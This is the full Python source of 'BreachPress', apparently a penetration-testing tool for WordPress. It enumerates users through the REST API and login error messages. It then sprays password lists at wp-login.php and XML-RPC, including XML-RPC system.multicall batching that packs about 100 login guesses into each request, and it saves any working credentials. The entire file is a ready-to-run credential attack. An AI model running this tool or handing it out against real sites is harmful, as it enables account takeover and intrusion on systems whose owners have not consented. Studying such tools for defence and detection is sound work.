#!/usr/bin/env python3
"""
BreachPress - WordPress Authentication Spray Tool
Author: Michael (Breach Craft)
Purpose: Enumerate users and perform intelligent password spraying across multiple WordPress authentication mechanisms
"""

import requests
import argparse
import sys
import time
import xml.etree.ElementTree as ET
from urllib.parse import urljoin
from typing import List, Dict, Tuple, Optional
import json
from concurrent.futures import ThreadPoolExecutor, as_completed
import logging

# Disable SSL warnings for pentesting
requests.packages.urllib3.disable_warnings()

class Colors:
    """ANSI color codes for terminal output"""
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKCYAN = '\033[96m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

class WordPressSpray:
    def __init__(self, target_url: str, timeout: int = 10, verify_ssl: bool = False, verbose: bool = False):
        """
        Initialize the WordPress spray tool
        
        Args:
            target_url: Base URL of the WordPress site
            timeout: Request timeout in seconds
            verify_ssl: Whether to verify SSL certificates
            verbose: Enable verbose logging
        """
        self.target_url = target_url.rstrip('/')
        self.timeout = timeout
        self.verify_ssl = verify_ssl
        self.verbose = verbose
        
        # Setup logging
        log_level = logging.DEBUG if verbose else logging.INFO
        logging.basicConfig(
            format='%(asctime)s - %(levelname)s - %(message)s',
            level=log_level
        )
        self.logger = logging.getLogger(__name__)
        
        # Attack surface tracking
        self.attack_surface = {
            'wp_login': False,
            'rest_api': False,
            'xmlrpc': False,
            'xmlrpc_multicall': False
        }
        
        self.session = requests.Session()
        self.session.verify = verify_ssl
        
    def print_banner(self):
        """Print tool banner"""
        banner = f"""
{Colors.OKBLUE}{'='*70}
BreachPress - WordPress Authentication Spray Tool
By: Michael @ Breach Craft
{'='*70}{Colors.ENDC}
{Colors.OKCYAN}Target: {self.target_url}{Colors.ENDC}
"""
        print(banner)
    
    def enumerate_attack_surface(self) -> Dict[str, bool]:
        """
        Enumerate available WordPress authentication mechanisms
        
        Returns:
            Dictionary of available attack vectors
        """
        print(f"\n{Colors.HEADER}[*] Enumerating Attack Surface...{Colors.ENDC}")
        
        # Check wp-login.php
        try:
            wp_login_url = urljoin(self.target_url, '/wp-login.php')
            resp = self.session.get(wp_login_url, timeout=self.timeout)
            if resp.status_code == 200 and 'login' in resp.text.lower():
                self.attack_surface['wp_login'] = True
                print(f"{Colors.OKGREEN}[+] wp-login.php: Available{Colors.ENDC}")
            else:
                print(f"{Colors.FAIL}[-] wp-login.php: Not found{Colors.ENDC}")
        except Exception as e:
            self.logger.debug(f"wp-login.php check failed: {e}")
            print(f"{Colors.FAIL}[-] wp-login.php: Error checking{Colors.ENDC}")
        
        # Check REST API
        try:
            rest_api_url = urljoin(self.target_url, '/wp-json/wp/v2/users')
            resp = self.session.get(rest_api_url, timeout=self.timeout)
            if resp.status_code == 200:
                self.attack_surface['rest_api'] = True
                print(f"{Colors.OKGREEN}[+] REST API: Available{Colors.ENDC}")
            else:
                print(f"{Colors.FAIL}[-] REST API: Not accessible{Colors.ENDC}")
        except Exception as e:
            self.logger.debug(f"REST API check failed: {e}")
            print(f"{Colors.FAIL}[-] REST API: Error checking{Colors.ENDC}")
        
        # Check XML-RPC
        try:
            xmlrpc_url = urljoin(self.target_url, '/xmlrpc.php')
            list_methods_xml = """<?xml version="1.0"?>
<methodCall>
    <methodName>system.listMethods</methodName>
</methodCall>"""
            
            resp = self.session.post(
                xmlrpc_url,
                data=list_methods_xml,
                headers={'Content-Type': 'application/xml'},
                timeout=self.timeout
            )
            
            if resp.status_code == 200 and 'methodResponse' in resp.text:
                self.attack_surface['xmlrpc'] = True
                print(f"{Colors.OKGREEN}[+] XML-RPC: Available{Colors.ENDC}")
                
                # Check for system.multicall
                if 'system.multicall' in resp.text:
                    self.attack_surface['xmlrpc_multicall'] = True
                    print(f"{Colors.OKGREEN}[++] XML-RPC system.multicall: Available (BEST ATTACK VECTOR){Colors.ENDC}")
                else:
                    print(f"{Colors.WARNING}[!] XML-RPC system.multicall: Not available{Colors.ENDC}")
            else:
                print(f"{Colors.FAIL}[-] XML-RPC: Not available{Colors.ENDC}")
        except Exception as e:
            self.logger.debug(f"XML-RPC check failed: {e}")
            print(f"{Colors.FAIL}[-] XML-RPC: Error checking{Colors.ENDC}")
        
        return self.attack_surface
    
    def enumerate_users_rest_api(self) -> List[str]:
        """
        Enumerate WordPress users via REST API
        
        Returns:
            List of discovered usernames
        """
        users = []
        print(f"\n{Colors.HEADER}[*] Enumerating users via REST API...{Colors.ENDC}")
        
        try:
            rest_api_url = urljoin(self.target_url, '/wp-json/wp/v2/users')
            resp = self.session.get(rest_api_url, timeout=self.timeout)
            
            if resp.status_code == 200:
                user_data = resp.json()
                for user in user_data:
                    username = user.get('slug') or user.get('name')
                    if username:
                        users.append(username)
                        print(f"{Colors.OKGREEN}[+] Found user: {username}{Colors.ENDC}")
                        if self.verbose:
                            print(f"    ID: {user.get('id')}, Name: {user.get('name')}")
            else:
                print(f"{Colors.WARNING}[!] REST API returned status {resp.status_code}{Colors.ENDC}")
        except Exception as e:
            self.logger.error(f"REST API enumeration failed: {e}")
            print(f"{Colors.FAIL}[-] Error enumerating users via REST API{Colors.ENDC}")
        
        return users
    
    def enumerate_users_wp_login(self, test_users: List[str]) -> List[str]:
        """
        Verify users exist via wp-login.php user enumeration
        
        Args:
            test_users: List of usernames to test
            
        Returns:
            List of confirmed usernames
        """
        confirmed_users = []
        print(f"\n{Colors.HEADER}[*] Verifying users via wp-login.php enumeration...{Colors.ENDC}")
        
        wp_login_url = urljoin(self.target_url, '/wp-login.php')
        
        for username in test_users:
            try:
                data = {
                    'log': username,
                    'pwd': 'thisisafakepasswordthatdoesnotexist12345',
                    'wp-submit': 'Log In'
                }
                
                resp = self.session.post(wp_login_url, data=data, timeout=self.timeout, allow_redirects=False)
                
                # Different error messages indicate valid vs invalid users
                if 'incorrect password' in resp.text.lower():
                    confirmed_users.append(username)
                    print(f"{Colors.OKGREEN}[+] Confirmed user: {username}{Colors.ENDC}")
                elif 'invalid username' in resp.text.lower():
                    print(f"{Colors.FAIL}[-] Invalid user: {username}{Colors.ENDC}")
                
                time.sleep(0.5)  # Small delay to avoid rate limiting
                
            except Exception as e:
                self.logger.debug(f"Error testing user {username}: {e}")
        
        return confirmed_users
    
    def spray_wp_login(self, usernames: List[str], passwords: List[str], delay: float = 1.0) -> List[Tuple[str, str]]:
        """
        Perform password spray against wp-login.php
        
        Args:
            usernames: List of usernames to test
            passwords: List of passwords to test
            delay: Delay between attempts in seconds
            
        Returns:
            List of successful (username, password) tuples
        """
        successful = []
        print(f"\n{Colors.HEADER}[*] Spraying wp-login.php...{Colors.ENDC}")
        print(f"[*] Testing {len(usernames)} users with {len(passwords)} passwords")
        
        wp_login_url = urljoin(self.target_url, '/wp-login.php')
        total_attempts = len(usernames) * len(passwords)
        current_attempt = 0
        
        for password in passwords:
            print(f"\n{Colors.OKCYAN}[*] Testing password: {password}{Colors.ENDC}")
            for username in usernames:
                current_attempt += 1
                try:
                    data = {
                        'log': username,
                        'pwd': password,
                        'wp-submit': 'Log In',
                        'redirect_to': urljoin(self.target_url, '/wp-admin/')
                    }
                    
                    resp = self.session.post(wp_login_url, data=data, timeout=self.timeout, allow_redirects=False)
                    
                    # Check for successful login
                    if resp.status_code == 302 and 'wp-admin' in resp.headers.get('Location', ''):
                        successful.append((username, password))
                        print(f"{Colors.OKGREEN}[+++] SUCCESS! {username}:{password}{Colors.ENDC}")
                    elif 'incorrect password' in resp.text.lower():
                        if self.verbose:
                            print(f"[{current_attempt}/{total_attempts}] {username}:{password} - Failed")
                    
                    time.sleep(delay)
                    
                except Exception as e:
                    self.logger.debug(f"Error testing {username}:{password} - {e}")
        
        return successful
    
    def spray_xmlrpc_multicall(self, usernames: List[str], passwords: List[str], batch_size: int = 100) -> List[Tuple[str, str]]:
        """
        Perform password spray using XML-RPC system.multicall (most efficient method)
        
        Args:
            usernames: List of usernames to test
            passwords: List of passwords to test
            batch_size: Number of attempts per multicall request
            
        Returns:
            List of successful (username, password) tuples
        """
        successful = []
        print(f"\n{Colors.HEADER}[*] Spraying via XML-RPC system.multicall (OPTIMIZED)...{Colors.ENDC}")
        print(f"[*] Testing {len(usernames)} users with {len(passwords)} passwords")
        print(f"[*] Using batch size: {batch_size} attempts per request")
        
        xmlrpc_url = urljoin(self.target_url, '/xmlrpc.php')
        
        # Build all combinations
        attempts = []
        for username in usernames:
            for password in passwords:
                attempts.append((username, password))
        
        total_attempts = len(attempts)
        print(f"[*] Total attempts: {total_attempts}")
        print(f"[*] HTTP requests needed: {(total_attempts + batch_size - 1) // batch_size}")
        
        # Process in batches
        for i in range(0, total_attempts, batch_size):
            batch = attempts[i:i + batch_size]
            print(f"\n{Colors.OKCYAN}[*] Processing batch {i//batch_size + 1} ({len(batch)} attempts)...{Colors.ENDC}")
            
            # Build multicall XML
            multicall_xml = self._build_multicall_xml(batch)
            
            try:
                resp = self.session.post(
                    xmlrpc_url,
                    data=multicall_xml,
                    headers={'Content-Type': 'application/xml'},
                    timeout=self.timeout * 3  # Longer timeout for batch
                )
                
                if resp.status_code == 200:
                    # Parse response
                    results = self._parse_multicall_response(resp.text, batch)
                    for username, password in results:
                        successful.append((username, password))
                        print(f"{Colors.OKGREEN}[+++] SUCCESS! {username}:{password}{Colors.ENDC}")
                else:
                    print(f"{Colors.FAIL}[-] Batch failed with status {resp.status_code}{Colors.ENDC}")
                
                time.sleep(1)  # Small delay between batches
                
            except Exception as e:
                self.logger.error(f"Batch request failed: {e}")
                print(f"{Colors.FAIL}[-] Error processing batch{Colors.ENDC}")
        
        return successful
    
    def _build_multicall_xml(self, attempts: List[Tuple[str, str]]) -> str:
        """
        Build XML-RPC multicall payload
        
        Args:
            attempts: List of (username, password) tuples
            
        Returns:
            XML string for multicall request
        """
        xml_parts = ['<?xml version="1.0"?>\n<methodCall>\n  <methodName>system.multicall</methodName>\n  <params>\n    <param>\n      <value>\n        <array>\n          <data>']
        
        for username, password in attempts:
            xml_parts.append(f"""
            <value>
              <struct>
                <member>
                  <name>methodName</name>
                  <value><string>wp.getUsersBlogs</string></value>
                </member>
                <member>
                  <name>params</name>
                  <value>
                    <array>
                      <data>
                        <value><string>{username}</string></value>
                        <value><string>{password}</string></value>
                      </data>
                    </array>
                  </value>
                </member>
              </struct>
            </value>""")
        
        xml_parts.append('\n          </data>\n        </array>\n      </value>\n    </param>\n  </params>\n</methodCall>')
        
        return ''.join(xml_parts)
    
    def _parse_multicall_response(self, xml_response: str, attempts: List[Tuple[str, str]]) -> List[Tuple[str, str]]:
        """
        Parse XML-RPC multicall response to find successful logins
        
        Args:
            xml_response: XML response from server
            attempts: Original list of attempts to map back
            
        Returns:
            List of successful (username, password) tuples
        """
        successful = []
        
        try:
            # Parse XML
            root = ET.fromstring(xml_response)
            
            # Find all response values
            responses = root.findall('.//data/value')
            
            for idx, response_elem in enumerate(responses):
                if idx >= len(attempts):
                    break
                
                # Check if this is a successful response (not a fault)
                fault = response_elem.find('.//fault')
                if fault is None:
                    # No fault means successful authentication
                    username, password = attempts[idx]
                    successful.append((username, password))
                elif self.verbose:
                    # Log fault details if verbose
                    fault_string = response_elem.find('.//member[name="faultString"]/value/string')
                    if fault_string is not None:
                        username, password = attempts[idx]
                        self.logger.debug(f"{username}:{password} - {fault_string.text}")
        
        except ET.ParseError as e:
            self.logger.error(f"Failed to parse XML response: {e}")
        
        return successful
    
    def spray_xmlrpc_single(self, usernames: List[str], passwords: List[str], delay: float = 0.5) -> List[Tuple[str, str]]:
        """
        Perform password spray using XML-RPC wp.getUsersBlogs (single requests)
        
        Args:
            usernames: List of usernames to test
            passwords: List of passwords to test
            delay: Delay between requests
            
        Returns:
            List of successful (username, password) tuples
        """
        successful = []
        print(f"\n{Colors.HEADER}[*] Spraying via XML-RPC (single requests)...{Colors.ENDC}")
        print(f"[*] Testing {len(usernames)} users with {len(passwords)} passwords")
        
        xmlrpc_url = urljoin(self.target_url, '/xmlrpc.php')
        total_attempts = len(usernames) * len(passwords)
        current_attempt = 0
        
        for password in passwords:
            print(f"\n{Colors.OKCYAN}[*] Testing password: {password}{Colors.ENDC}")
            for username in usernames:
                current_attempt += 1
                
                xml_payload = f"""<?xml version="1.0"?>
<methodCall>
    <methodName>wp.getUsersBlogs</methodName>
    <params>
        <param><value><string>{username}</string></value></param>
        <param><value><string>{password}</string></value></param>
    </params>
</methodCall>"""
                
                try:
                    resp = self.session.post(
                        xmlrpc_url,
                        data=xml_payload,
                        headers={'Content-Type': 'application/xml'},
                        timeout=self.timeout
                    )
                    
                    if resp.status_code == 200:
                        # Check if response contains fault (failed auth)
                        if '<fault>' in resp.text:
                            if self.verbose:
                                print(f"[{current_attempt}/{total_attempts}] {username}:{password} - Failed")
                        else:
                            # Successful authentication
                            successful.append((username, password))
                            print(f"{Colors.OKGREEN}[+++] SUCCESS! {username}:{password}{Colors.ENDC}")
                    
                    time.sleep(delay)
                    
                except Exception as e:
                    self.logger.debug(f"Error testing {username}:{password} - {e}")
        
        return successful


def load_list_from_file(filepath: str) -> List[str]:
    """Load a list from a file (one item per line)"""
    try:
        with open(filepath, 'r') as f:
            return [line.strip() for line in f if line.strip()]
    except FileNotFoundError:
        print(f"{Colors.FAIL}[-] File not found: {filepath}{Colors.ENDC}")
        sys.exit(1)


def main():
    parser = argparse.ArgumentParser(
        description='BreachPress - WordPress Authentication Spray Tool',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  # Enumerate attack surface and users only
  python3 breachpress.py -u https://example.com --enumerate-only
  
  # Spray with userlist and passwordlist via best available method
  python3 breachpress.py -u https://example.com -U users.txt -P passwords.txt
  
  # Force specific attack method
  python3 breachpress.py -u https://example.com -U users.txt -P passwords.txt --method xmlrpc-multicall
  
  # Enumerate users and spray in one go
  python3 breachpress.py -u https://example.com -P passwords.txt --auto-enum
        """
    )
    
    parser.add_argument('-u', '--url', required=True, help='Target WordPress URL')
    parser.add_argument('-U', '--userlist', help='File containing usernames (one per line)')
    parser.add_argument('-P', '--passwordlist', help='File containing passwords (one per line)')
    parser.add_argument('--user', help='Single username to test')
    parser.add_argument('--password', help='Single password to test')
    parser.add_argument('--method', choices=['auto', 'xmlrpc-multicall', 'xmlrpc-single', 'wp-login'],
                       default='auto', help='Attack method (default: auto - uses best available)')
    parser.add_argument('--enumerate-only', action='store_true', 
                       help='Only enumerate attack surface and users, do not spray')
    parser.add_argument('--auto-enum', action='store_true',
                       help='Automatically enumerate users before spraying')
    parser.add_argument('--batch-size', type=int, default=100,
                       help='Batch size for multicall requests (default: 100)')
    parser.add_argument('--delay', type=float, default=1.0,
                       help='Delay between requests in seconds (default: 1.0)')
    parser.add_argument('--timeout', type=int, default=10,
                       help='Request timeout in seconds (default: 10)')
    parser.add_argument('--no-ssl-verify', action='store_true',
                       help='Disable SSL certificate verification')
    parser.add_argument('-v', '--verbose', action='store_true',
                       help='Enable verbose output')
    parser.add_argument('-o', '--output', help='Output file for successful credentials')
    
    args = parser.parse_args()
    
    # Initialize the spray tool
    spray = WordPressSpray(
        target_url=args.url,
        timeout=args.timeout,
        verify_ssl=not args.no_ssl_verify,
        verbose=args.verbose
    )
    
    spray.print_banner()
    
    # Enumerate attack surface
    attack_surface = spray.enumerate_attack_surface()
    
    # Enumerate users if requested or if auto-enum
    usernames = []
    if args.enumerate_only or args.auto_enum:
        if attack_surface['rest_api']:
            usernames = spray.enumerate_users_rest_api()
    
    # If enumerate-only, stop here
    if args.enumerate_only:
        print(f"\n{Colors.OKGREEN}[*] Enumeration complete!{Colors.ENDC}")
        if usernames:
            print(f"{Colors.OKGREEN}[*] Found {len(usernames)} users{Colors.ENDC}")
        sys.exit(0)
    
    # Load or set usernames
    if args.auto_enum and usernames:
        print(f"\n{Colors.OKGREEN}[*] Using {len(usernames)} auto-enumerated users{Colors.ENDC}")
    elif args.userlist:
        usernames = load_list_from_file(args.userlist)
        print(f"\n{Colors.OKGREEN}[*] Loaded {len(usernames)} users from {args.userlist}{Colors.ENDC}")
    elif args.user:
        usernames = [args.user]
    else:
        print(f"{Colors.FAIL}[-] No users specified! Use -U, --user, or --auto-enum{Colors.ENDC}")
        sys.exit(1)
    
    # Load passwords
    if args.passwordlist:
        passwords = load_list_from_file(args.passwordlist)
        print(f"{Colors.OKGREEN}[*] Loaded {len(passwords)} passwords from {args.passwordlist}{Colors.ENDC}")
    elif args.password:
        passwords = [args.password]
    else:
        print(f"{Colors.FAIL}[-] No passwords specified! Use -P or --password{Colors.ENDC}")
        sys.exit(1)
    
    # Determine attack method
    method = args.method
    if method == 'auto':
        if attack_surface['xmlrpc_multicall']:
            method = 'xmlrpc-multicall'
            print(f"{Colors.OKGREEN}[*] Auto-selected method: XML-RPC Multicall (most efficient){Colors.ENDC}")
        elif attack_surface['xmlrpc']:
            method = 'xmlrpc-single'
            print(f"{Colors.WARNING}[*] Auto-selected method: XML-RPC Single (multicall not available){Colors.ENDC}")
        elif attack_surface['wp_login']:
            method = 'wp-login'
            print(f"{Colors.WARNING}[*] Auto-selected method: wp-login.php (least efficient){Colors.ENDC}")
        else:
            print(f"{Colors.FAIL}[-] No attack methods available!{Colors.ENDC}")
            sys.exit(1)
    
    # Execute spray based on method
    successful = []
    
    if method == 'xmlrpc-multicall':
        if not attack_surface['xmlrpc_multicall']:
            print(f"{Colors.FAIL}[-] XML-RPC multicall not available!{Colors.ENDC}")
            sys.exit(1)
        successful = spray.spray_xmlrpc_multicall(usernames, passwords, args.batch_size)
    
    elif method == 'xmlrpc-single':
        if not attack_surface['xmlrpc']:
            print(f"{Colors.FAIL}[-] XML-RPC not available!{Colors.ENDC}")
            sys.exit(1)
        successful = spray.spray_xmlrpc_single(usernames, passwords, args.delay)
    
    elif method == 'wp-login':
        if not attack_surface['wp_login']:
            print(f"{Colors.FAIL}[-] wp-login.php not available!{Colors.ENDC}")
            sys.exit(1)
        successful = spray.spray_wp_login(usernames, passwords, args.delay)
    
    # Print results
    print(f"\n{Colors.HEADER}{'='*70}{Colors.ENDC}")
    print(f"{Colors.HEADER}[*] Spray Complete!{Colors.ENDC}")
    print(f"{Colors.HEADER}{'='*70}{Colors.ENDC}")
    
    if successful:
        print(f"\n{Colors.OKGREEN}[+++] Found {len(successful)} valid credential(s):{Colors.ENDC}\n")
        for username, password in successful:
            print(f"{Colors.OKGREEN}  {username}:{password}{Colors.ENDC}")
        
        # Save to output file if specified
        if args.output:
            try:
                with open(args.output, 'w') as f:
                    for username, password in successful:
                        f.write(f"{username}:{password}\n")
                print(f"\n{Colors.OKGREEN}[*] Credentials saved to {args.output}{Colors.ENDC}")
            except Exception as e:
                print(f"{Colors.FAIL}[-] Error saving to file: {e}{Colors.ENDC}")
    else:
        print(f"\n{Colors.WARNING}[!] No valid credentials found{Colors.ENDC}")
    
    print()


if __name__ == '__main__':
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n\n{Colors.WARNING}[!] Interrupted by user{Colors.ENDC}")
        sys.exit(0)
    except Exception as e:
        print(f"\n{Colors.FAIL}[-] Unexpected error: {e}{Colors.ENDC}")
        sys.exit(1)
